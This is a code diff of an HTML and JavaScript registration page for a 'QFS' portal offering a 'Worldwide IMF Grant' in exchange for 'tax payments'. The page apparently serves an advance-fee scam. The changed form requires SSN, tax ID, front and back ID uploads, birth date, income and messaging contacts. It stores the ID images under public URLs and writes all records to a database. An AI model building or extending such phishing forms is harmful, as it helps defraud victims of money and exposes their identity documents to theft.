@@ -36,7 +36,6 @@
       border-color: #ef4444 !important;
       border-width: 2px !important;
     }
-    /* Hide fields completely - they won't be visible or take up space */
     .hidden-section {
       display: none !important;
     }
@@ -172,36 +171,41 @@
       </div>
 
       <!-- ========== IMF FIELDS (hidden by default) ========== -->
-      <div id="imfSection" class="hidden space-y-4 border-t-2 border-blue-200 pt-6">
+      <div id="imfSection" class="hidden-section space-y-4 border-t-2 border-blue-200 pt-6">
         <h3 class="text-xl font-bold text-blue-800">🌍 WORLDWIDE IMF GRANT APPLICATION</h3>
         <p class="text-sm text-gray-600 mb-4">Please fill all fields below. They are all required.</p>
+
+        <!-- Full Name (auto-filled from above) -->
+        <div class="bg-blue-50 p-4 rounded-lg">
+          <p class="text-sm font-semibold">Your full name: <span id="displayFullName"></span></p>
+        </div>
 
         <!-- SSN -->
         <div>
           <label class="font-semibold required-label">SSN</label>
-          <input type="text" name="imf_ssn" id="imf_ssn" placeholder="XXX-XX-XXXX" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_ssn" placeholder="XXX-XX-XXXX" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
-        <!-- ID Upload Front & Back -->
+        <!-- ID Upload (combine front and back into one file URL) -->
         <div>
           <label class="font-semibold required-label">Upload Valid ID (Front)</label>
-          <input type="file" name="imf_id_front" id="imf_id_front" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
+          <input type="file" id="imf_id_front" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
         </div>
         <div>
           <label class="font-semibold required-label">Upload Valid ID (Back)</label>
-          <input type="file" name="imf_id_back" id="imf_id_back" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
+          <input type="file" id="imf_id_back" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
         </div>
 
         <!-- Email -->
         <div>
           <label class="font-semibold required-label">Email Address</label>
-          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
+          <input type="email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
         </div>
 
         <!-- Grant Amount -->
         <div>
           <label class="font-semibold required-label">Choose your Grant Application Amount</label>
-          <select name="imf_grant_amount" id="imf_grant_amount" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <select id="imf_grant_amount" class="imf-field w-full mt-1 p-3 border rounded-lg">
             <option value="">Select grant amount</option>
             <option value="10000">$10,000 (tax payment of $1,250)</option>
             <option value="20000">$20,000 (tax payment of $2,450)</option>
@@ -217,37 +221,37 @@
         <!-- Tax ID -->
         <div>
           <label class="font-semibold required-label">Tax ID</label>
-          <input type="text" name="imf_tax_id" id="imf_tax_id" placeholder="Tax ID number" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_tax_id" placeholder="Tax ID number" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Address -->
         <div>
           <label class="font-semibold required-label">Address</label>
-          <input type="text" name="imf_address" id="imf_address" placeholder="Street address" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_address" placeholder="Street address" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Country -->
         <div>
           <label class="font-semibold required-label">Country</label>
-          <input type="text" name="imf_country" id="imf_country" placeholder="Your country" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_country" placeholder="Your country" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- WhatsApp/Telegram -->
         <div>
           <label class="font-semibold required-label">WhatsApp OR Telegram Number</label>
-          <input type="text" name="imf_whatsapp" id="imf_whatsapp" placeholder="Include country code" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_whatsapp" placeholder="Include country code" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Phone Number -->
         <div>
           <label class="font-semibold required-label">Phone Number / Texting Number</label>
-          <input type="tel" name="imf_phone" id="imf_phone" placeholder="Phone number for texts" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="tel" id="imf_phone" placeholder="Phone number for texts" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Gender -->
         <div>
           <label class="font-semibold required-label">Gender</label>
-          <select name="imf_gender" id="imf_gender" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <select id="imf_gender" class="imf-field w-full mt-1 p-3 border rounded-lg">
             <option value="">Select gender</option>
             <option value="Male">Male</option>
             <option value="Female">Female</option>
@@ -259,19 +263,19 @@
         <!-- Date of Birth -->
         <div>
           <label class="font-semibold required-label">Date of Birth</label>
-          <input type="date" name="imf_dob" id="imf_dob" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="date" id="imf_dob" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Monthly Income -->
         <div>
           <label class="font-semibold required-label">Monthly Income</label>
-          <input type="text" name="imf_monthly_income" id="imf_monthly_income" placeholder="Your monthly income" class="imf-field w-full mt-1 p-3 border rounded-lg">
+          <input type="text" id="imf_monthly_income" placeholder="Your monthly income" class="imf-field w-full mt-1 p-3 border rounded-lg">
         </div>
 
         <!-- Purpose -->
         <div>
           <label class="font-semibold required-label">Purpose of filling grant</label>
-          <textarea name="imf_purpose" id="imf_purpose" placeholder="Please explain why you need this grant" rows="3" class="imf-field w-full mt-1 p-3 border rounded-lg"></textarea>
+          <textarea id="imf_purpose" placeholder="Please explain why you need this grant" rows="3" class="imf-field w-full mt-1 p-3 border rounded-lg"></textarea>
         </div>
 
         <p class="text-xs text-gray-500 mt-4">By submitting, you agree to the IMF grant terms. All fields are required. No Supabase account will be created.</p>
@@ -291,7 +295,7 @@
       
       // Check if config is loaded
       if (!window.__QFS_CONFIG) {
-        console.error("Config not loaded! Make sure config.js is loaded first.");
+        console.error("Config not loaded!");
         const msgEl = document.getElementById('regMsg');
         if (msgEl) {
           msgEl.textContent = "Configuration error. Please refresh.";
@@ -325,6 +329,7 @@
       const formTitle = document.getElementById("formTitle");
       const msg = document.getElementById("regMsg");
       const btn = document.getElementById("regSubmit");
+      const displayFullName = document.getElementById("displayFullName");
       
       // Regular fields
       const emailEl = document.getElementById("regEmail");
@@ -334,18 +339,23 @@
       const middleNameEl = document.getElementById("middleName");
       const lastNameEl = document.getElementById("lastName");
       const countryEl = document.getElementById("countryEl");
-      const dobEl = document.getElementById("dob");
-      const phoneEl = document.getElementById("phone");
-      const genderEl = document.getElementById("gender");
-      const paymentOptionEl = document.getElementById("payment_option");
-      const streetAddressEl = document.getElementById("street_address");
-      const cityEl = document.getElementById("city");
-      const stateEl = document.getElementById("state");
-      const zipEl = document.getElementById("zip");
       
       // IMF fields
       const imfFields = document.querySelectorAll('.imf-field');
       const imfEmail = document.getElementById('imf_email');
+      const imfSsn = document.getElementById('imf_ssn');
+      const imfTaxId = document.getElementById('imf_tax_id');
+      const imfGrantAmount = document.getElementById('imf_grant_amount');
+      const imfWhatsapp = document.getElementById('imf_whatsapp');
+      const imfPhone = document.getElementById('imf_phone');
+      const imfGender = document.getElementById('imf_gender');
+      const imfDob = document.getElementById('imf_dob');
+      const imfMonthlyIncome = document.getElementById('imf_monthly_income');
+      const imfPurpose = document.getElementById('imf_purpose');
+      const imfAddress = document.getElementById('imf_address');
+      const imfCountry = document.getElementById('imf_country');
+      const idFront = document.getElementById('imf_id_front');
+      const idBack = document.getElementById('imf_id_back');
 
       // Gold card elements
       const goldOption = document.getElementById("goldOption");
@@ -353,375 +363,185 @@
 
       // Arrays of fields
       const normalRequiredFields = [
-        dobEl, phoneEl, genderEl, emailEl, p1, p2, 
-        paymentOptionEl, streetAddressEl, cityEl, stateEl, zipEl, countryEl
+        document.getElementById("dob"),
+        document.getElementById("phone"),
+        document.getElementById("gender"),
+        emailEl, p1, p2,
+        document.getElementById("payment_option"),
+        document.getElementById("street_address"),
+        document.getElementById("city"),
+        document.getElementById("state"),
+        document.getElementById("zip"),
+        countryEl
       ];
 
-      console.log("Form found:", !!form);
-      console.log("Button found:", !!btn);
-
-      // Helper functions
-      function showMessage(text, isSuccess = true) {
-        if (!msg) return;
-        msg.textContent = text;
-        msg.className = "text-sm text-center " + (isSuccess ? "text-emerald-600" : "text-red-600");
-        msg.classList.remove("hidden");
-        console.log("Message:", text);
-        
-        if (isSuccess) {
-          setTimeout(() => {
-            if (msg) msg.classList.add("hidden");
-          }, 5000);
+      // Update full name display
+      function updateFullName() {
+        if (displayFullName) {
+          const fullName = `${firstNameEl?.value || ''} ${middleNameEl?.value || ''} ${lastNameEl?.value || ''}`.replace(/\s+/g, ' ').trim();
+          displayFullName.textContent = fullName || 'Your full name';
         }
       }
 
-      function hideMessage() {
-        if (msg) msg.classList.add("hidden");
-      }
-
-      // Clear red borders on input
-      function clearBorderOnInput(e) {
-        e.target.classList.remove('border-red-500');
-      }
-
-      // Add input event listeners
-      document.querySelectorAll('input, select, textarea').forEach(field => {
-        field.addEventListener('input', clearBorderOnInput);
-        field.addEventListener('change', clearBorderOnInput);
-      });
+      firstNameEl?.addEventListener('input', updateFullName);
+      middleNameEl?.addEventListener('input', updateFullName);
+      lastNameEl?.addEventListener('input', updateFullName);
 
       // Copy email
       if (emailEl && imfEmail) {
-        emailEl.addEventListener('input', function() {
-          imfEmail.value = this.value;
-        });
+        emailEl.addEventListener('input', () => imfEmail.value = emailEl.value);
       }
 
-      // Toggle IMF mode - COMPLETELY remove required from hidden fields
+      // Toggle IMF mode
       function toggleImfMode(enableImf) {
         console.log("Toggle IMF mode:", enableImf);
         
         if (enableImf) {
-          // Hide normal fields
-          if (normalFields) normalFields.classList.add("hidden");
+          normalFields?.classList.add("hidden-section");
+          formTitle.textContent = "🌍 Worldwide IMF Grant";
+          pageSubtitle.textContent = "You are applying for the WORLDWIDE IMF GRANT. Please complete all required fields below. No password needed.";
+          imfSection?.classList.remove("hidden-section");
           
-          // REMOVE required from ALL normal fields
-          normalRequiredFields.forEach(field => {
-            if (field) {
-              field.required = false;
-              console.log("Removed required from normal field:", field.id || field.name);
-            }
-          });
+          normalRequiredFields.forEach(f => { if (f) f.required = false; });
+          imfFields.forEach(f => f.required = true);
           
-          // Change title
-          if (formTitle) formTitle.textContent = "🌍 Worldwide IMF Grant";
-          if (pageSubtitle) pageSubtitle.textContent = "You are applying for the WORLDWIDE IMF GRANT. Please complete all required fields below. No password needed.";
-          
-          // Show IMF section
-          if (imfSection) imfSection.classList.remove("hidden");
-          
-          // ADD required to IMF fields
-          imfFields.forEach(field => {
-            field.required = true;
-            console.log("Added required to IMF field:", field.id || field.name);
-          });
-          
-          // Copy email
-          if (emailEl && imfEmail) {
-            imfEmail.value = emailEl.value;
-          }
+          if (emailEl && imfEmail) imfEmail.value = emailEl.value;
+          updateFullName();
         } else {
-          // Show normal fields
-          if (normalFields) normalFields.classList.remove("hidden");
+          normalFields?.classList.remove("hidden-section");
+          formTitle.textContent = "QFS Registration Form";
+          pageSubtitle.textContent = "Create your portal login password below. After submitting, you can sign in on the Login page.";
+          imfSection?.classList.add("hidden-section");
           
-          // ADD required back to normal fields
-          normalRequiredFields.forEach(field => {
-            if (field) {
-              field.required = true;
-              console.log("Added required to normal field:", field.id || field.name);
-            }
-          });
-          
-          // Restore title
-          if (formTitle) formTitle.textContent = "QFS Registration Form";
-          if (pageSubtitle) pageSubtitle.textContent = "Create your portal login password below. After submitting, you can sign in on the Login page.";
-          
-          // Hide IMF section
-          if (imfSection) imfSection.classList.add("hidden");
-          
-          // REMOVE required from IMF fields
-          imfFields.forEach(field => {
-            field.required = false;
-            console.log("Removed required from IMF field:", field.id || field.name);
-          });
+          normalRequiredFields.forEach(f => { if (f) f.required = true; });
+          imfFields.forEach(f => f.required = false);
         }
       }
 
       // Listen for dropdown change
-      if (regFor) {
-        regFor.addEventListener("change", () => {
-          const isImfSelected = (regFor.value === "WORLDWIDE IMF GRANT");
-          toggleImfMode(isImfSelected);
-          hideMessage();
-        });
-      }
-
-      // Gold card visibility
-      if (countryEl) {
-        countryEl.addEventListener("input", function() {
-          if (goldOption && goldHiddenNote) {
-            const country = this.value.trim().toUpperCase();
-            if (country === "USA" || country === "UNITED STATES" || country === "US") {
-              goldOption.classList.add("hidden");
-              goldHiddenNote.classList.remove("hidden");
-              if (regFor && regFor.value === "Trump Gold Card Program") {
-                regFor.value = "";
-              }
-            } else {
-              goldOption.classList.remove("hidden");
-              goldHiddenNote.classList.add("hidden");
-            }
-          }
-        });
-      }
+      regFor?.addEventListener("change", () => {
+        toggleImfMode(regFor.value === "WORLDWIDE IMF GRANT");
+      });
 
       // Check initial state
-      if (regFor && regFor.value === "WORLDWIDE IMF GRANT") {
+      if (regFor?.value === "WORLDWIDE IMF GRANT") {
         toggleImfMode(true);
       }
 
-      // Form submission handler
+      // Form submission
       let busy = false;
       
-      if (form) {
-        console.log("Adding submit event listener");
+      form?.addEventListener("submit", async (e) => {
+        e.preventDefault();
         
-        form.addEventListener("submit", async function(event) {
-          event.preventDefault();
-          event.stopPropagation();
-          console.log("Form submitted!");
-          
-          if (busy) {
-            showMessage("Already processing your request...", false);
-            return;
-          }
-          
-          busy = true;
-          if (btn) btn.disabled = true;
-          
-          const isIMF = (regFor && regFor.value === "WORLDWIDE IMF GRANT");
-          hideMessage();
-          
-          try {
-            // Validate registration type
-            if (!regFor || !regFor.value) {
-              if (regFor) {
-                regFor.focus();
-                regFor.classList.add('border-red-500');
-              }
-              throw new Error("Please select what you're registering for.");
-            }
+        if (busy) return;
+        busy = true;
+        btn.disabled = true;
+        
+        const isIMF = regFor?.value === "WORLDWIDE IMF GRANT";
+        
+        try {
+          if (!regFor?.value) throw new Error("Please select what you're registering for.");
+          if (!firstNameEl?.value.trim()) throw new Error("First name is required.");
+          if (!lastNameEl?.value.trim()) throw new Error("Last name is required.");
 
-            // Validate name fields
-            if (!firstNameEl || !firstNameEl.value.trim()) {
-              if (firstNameEl) {
-                firstNameEl.focus();
-                firstNameEl.classList.add('border-red-500');
-              }
-              throw new Error("First name is required.");
-            }
-            
-            if (!lastNameEl || !lastNameEl.value.trim()) {
-              if (lastNameEl) {
-                lastNameEl.focus();
-                lastNameEl.classList.add('border-red-500');
-              }
-              throw new Error("Last name is required.");
-            }
+          if (isIMF) {
+            // Validate IMF fields
+            if (!imfSsn?.value.trim()) throw new Error("SSN is required.");
+            if (!idFront?.files[0]) throw new Error("Front ID is required.");
+            if (!idBack?.files[0]) throw new Error("Back ID is required.");
+            if (!imfEmail?.value.trim()) throw new Error("Email is required.");
+            if (!imfGrantAmount?.value) throw new Error("Grant amount is required.");
+            if (!imfTaxId?.value.trim()) throw new Error("Tax ID is required.");
+            if (!imfAddress?.value.trim()) throw new Error("Address is required.");
+            if (!imfCountry?.value.trim()) throw new Error("Country is required.");
+            if (!imfWhatsapp?.value.trim()) throw new Error("WhatsApp is required.");
+            if (!imfPhone?.value.trim()) throw new Error("Phone is required.");
+            if (!imfGender?.value) throw new Error("Gender is required.");
+            if (!imfDob?.value) throw new Error("Date of birth is required.");
+            if (!imfMonthlyIncome?.value.trim()) throw new Error("Monthly income is required.");
+            if (!imfPurpose?.value.trim()) throw new Error("Purpose is required.");
 
-            // Handle IMF submission
-            if (isIMF) {
-              console.log("Processing IMF submission");
-              
-              // Validate IMF fields
-              let firstInvalid = null;
-              
-              imfFields.forEach(field => {
-                if (field.type !== 'file') {
-                  if (!field.value.trim()) {
-                    field.classList.add('border-red-500');
-                    if (!firstInvalid) firstInvalid = field;
-                    console.log("Empty field:", field.id || field.name);
-                  }
-                }
-              });
-              
-              const idFront = document.getElementById('imf_id_front');
-              const idBack = document.getElementById('imf_id_back');
-              
-              if (idFront && !idFront.files[0]) {
-                idFront.classList.add('border-red-500');
-                if (!firstInvalid) firstInvalid = idFront;
-              }
-              
-              if (idBack && !idBack.files[0]) {
-                idBack.classList.add('border-red-500');
-                if (!firstInvalid) firstInvalid = idBack;
-              }
-              
-              if (!imfEmail || !imfEmail.value.trim()) {
-                if (imfEmail) {
-                  imfEmail.classList.add('border-red-500');
-                  if (!firstInvalid) firstInvalid = imfEmail;
-                }
-              }
-              
-              if (firstInvalid) {
-                firstInvalid.focus();
-                throw new Error("Please fill all required IMF fields and upload both ID images.");
-              }
-              
-              showMessage("Submitting IMF application...", true);
-              
-              try {
-                // Upload files
-                const fileFront = idFront.files[0];
-                const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
-                
-                const { error: uploadErrorFront } = await supabase.storage
-                  .from('imf-ids')
-                  .upload(fileNameFront, fileFront);
-                  
-                if (uploadErrorFront) throw new Error("Front ID upload failed");
-                
-                const fileBack = idBack.files[0];
-                const fileNameBack = `imf_${Date.now()}_back_${fileBack.name.replace(/[^a-z0-9.]/gi, '_')}`;
-                
-                const { error: uploadErrorBack } = await supabase.storage
-                  .from('imf-ids')
-                  .upload(fileNameBack, fileBack);
-                  
-                if (uploadErrorBack) throw new Error("Back ID upload failed");
-                
-                // Get URLs
-                const { data: frontPublicUrl } = supabase.storage
-                  .from('imf-ids')
-                  .getPublicUrl(fileNameFront);
-                  
-                const { data: backPublicUrl } = supabase.storage
-                  .from('imf-ids')
-                  .getPublicUrl(fileNameBack);
-                
-                // Prepare data
-                const imfData = {
-                  full_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
-                  ssn: document.getElementById('imf_ssn').value.trim(),
-                  id_front_url: frontPublicUrl?.publicUrl || '',
-                  id_back_url: backPublicUrl?.publicUrl || '',
-                  email: imfEmail.value.trim(),
-                  grant_amount: document.getElementById('imf_grant_amount').value,
-                  tax_id: document.getElementById('imf_tax_id').value.trim(),
-                  address: document.getElementById('imf_address').value.trim(),
-                  country: document.getElementById('imf_country').value.trim(),
-                  whatsapp: document.getElementById('imf_whatsapp').value.trim(),
-                  phone: document.getElementById('imf_phone').value.trim(),
-                  gender: document.getElementById('imf_gender').value,
-                  dob: document.getElementById('imf_dob').value,
-                  monthly_income: document.getElementById('imf_monthly_income').value.trim(),
-                  purpose: document.getElementById('imf_purpose').value.trim(),
-                  registering_for: 'WORLDWIDE IMF GRANT',
-                  created_at: new Date().toISOString()
-                };
-                
-                const { error: insertError } = await supabase
-                  .from('imf_applications')
-                  .insert([imfData]);
-                  
-                if (insertError) throw new Error("Database insert failed");
-                
-                showMessage("✅ IMF application submitted successfully!", true);
-                
-                setTimeout(() => {
-                  if (form) form.reset();
-                  toggleImfMode(false);
-                  busy = false;
-                  if (btn) btn.disabled = false;
-                }, 3000);
-                
-              } catch (uploadErr) {
-                throw new Error("Upload failed");
-              }
-              
-              return;
-            }
+            // Upload files
+            const fileFront = idFront.files[0];
+            const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
+            const { error: uploadErrorFront } = await supabase.storage.from('imf-ids').upload(fileNameFront, fileFront);
+            if (uploadErrorFront) throw new Error("Front ID upload failed");
+
+            const fileBack = idBack.files[0];
+            const fileNameBack = `imf_${Date.now()}_back_${fileBack.name.replace(/[^a-z0-9.]/gi, '_')}`;
+            const { error: uploadErrorBack } = await supabase.storage.from('imf-ids').upload(fileNameBack, fileBack);
+            if (uploadErrorBack) throw new Error("Back ID upload failed");
+
+            const { data: frontPublicUrl } = supabase.storage.from('imf-ids').getPublicUrl(fileNameFront);
+            const { data: backPublicUrl } = supabase.storage.from('imf-ids').getPublicUrl(fileNameBack);
+
+            // Prepare data matching your table schema
+            const imfData = {
+              full_name: `${firstNameEl.value.trim()} ${lastNameEl.value.trim()}`.trim(),
+              email: imfEmail.value.trim(),
+              ssn: imfSsn.value.trim(),
+              tax_id: imfTaxId.value.trim(),
+              grant_amount: imfGrantAmount.value,
+              monthly_income: imfMonthlyIncome.value.trim(),
+              purpose: imfPurpose.value.trim(),
+              phone: imfPhone.value.trim(),
+              whatsapp: imfWhatsapp.value.trim(),
+              address: imfAddress.value.trim(),
+              country: imfCountry.value.trim(),
+              id_file_url: frontPublicUrl?.publicUrl || '', // Store front ID URL
+              gender: imfGender.value,
+              dob: imfDob.value,
+              created_at: new Date().toISOString()
+            };
+
+            console.log("Submitting:", imfData);
+
+            const { error: insertError } = await supabase.from('imf_applications').insert([imfData]);
+            if (insertError) throw new Error(insertError.message);
+
+            msg.textContent = "✅ Application submitted successfully!";
+            msg.className = "text-emerald-600 text-center";
+            msg.classList.remove("hidden");
             
+            setTimeout(() => form.reset(), 2000);
+          } else {
             // Normal registration
-            console.log("Processing normal registration");
-            
-            if (!emailEl || !emailEl.value.trim()) {
-              if (emailEl) {
-                emailEl.focus();
-                emailEl.classList.add('border-red-500');
-              }
-              throw new Error("Email is required.");
-            }
-            
-            if (!p1 || !p1.value) {
-              if (p1) {
-                p1.focus();
-                p1.classList.add('border-red-500');
-              }
-              throw new Error("Password is required.");
-            }
-            
-            if (p1.value.length < 8) {
-              if (p1) {
-                p1.focus();
-                p1.classList.add('border-red-500');
-              }
-              throw new Error("Password must be at least 8 characters.");
-            }
-            
-            if (p1.value !== p2.value) {
-              if (p2) {
-                p2.focus();
-                p2.classList.add('border-red-500');
-              }
-              throw new Error("Passwords do not match.");
-            }
-            
-            showMessage("Creating your portal account…", true);
-            
+            if (!emailEl?.value.trim()) throw new Error("Email is required.");
+            if (!p1?.value) throw new Error("Password is required.");
+            if (p1.value.length < 8) throw new Error("Password must be at least 8 characters.");
+            if (p1.value !== p2?.value) throw new Error("Passwords do not match.");
+
             const { error } = await supabase.auth.signUp({
               email: emailEl.value.trim().toLowerCase(),
               password: p1.value.trim(),
-              options: {
-                data: {
-                  first_name: firstNameEl ? firstNameEl.value.trim() : '',
-                  middle_name: middleNameEl ? middleNameEl.value.trim() : '',
-                  last_name: lastNameEl ? lastNameEl.value.trim() : '',
-                  registering_for: regFor.value,
-                  country: countryEl ? countryEl.value.trim() : ''
-                }
+              options: { 
+                data: { 
+                  first_name: firstNameEl.value.trim(),
+                  last_name: lastNameEl.value.trim(),
+                  registering_for: regFor.value 
+                } 
               }
             });
             
             if (error) throw error;
             
-            showMessage("✅ Account created successfully!", true);
+            msg.textContent = "✅ Account created! Redirecting...";
+            msg.className = "text-emerald-600 text-center";
+            msg.classList.remove("hidden");
             
-            setTimeout(() => {
-              window.location.href = "https://qfsnesaragesara.org/success-registration.html";
-            }, 2000);
-            
-          } catch (err) {
-            console.error("Error:", err);
-            showMessage(err.message, false);
-            busy = false;
-            if (btn) btn.disabled = false;
+            setTimeout(() => window.location.href = "https://qfsnesaragesara.org/success-registration.html", 2000);
           }
-        });
-      }
+        } catch (err) {
+          console.error("Error:", err);
+          msg.textContent = err.message;
+          msg.className = "text-red-600 text-center";
+          msg.classList.remove("hidden");
+        } finally {
+          busy = false;
+          btn.disabled = false;
+        }
+      });
     })();
   </script>
 </body>
